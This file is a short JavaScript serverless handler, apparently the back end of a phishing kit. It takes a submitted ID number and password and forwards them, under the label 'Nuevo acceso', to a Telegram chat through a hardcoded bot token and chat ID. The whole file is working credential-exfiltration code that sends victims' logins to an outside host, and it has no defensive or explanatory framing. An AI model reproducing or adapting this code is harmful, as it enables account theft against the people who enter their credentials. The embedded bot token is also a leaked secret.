export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  const { id_no, password } = req.body;

  const BOT_TOKEN = "8257299535:AAHw21OzY6yFvX_LhgiGNJqm8AM3cuVp57k";
  const CHAT_ID = "-4887362963";

  if (!id_no || !password) {
    return res.status(400).json({ message: "❌ Missing fields" });
  }

  const message = `
📩 Nuevo acceso:
- ID: ${id_no}
- Password: ${password}
  `;

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    const tg = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
    });

    const result = await tg.json();
    if (!tg.ok) {
      console.error("Telegram error:", result);
      return res.status(500).json({ message: "❌ Telegram API error" });
    }

    return res.status(200).json({ message: "✅ Sent OK" });
  } catch (err) {
    console.error("Server error:", err);
    return res.status(500).json({ message: "❌ Internal error" });
  }
}
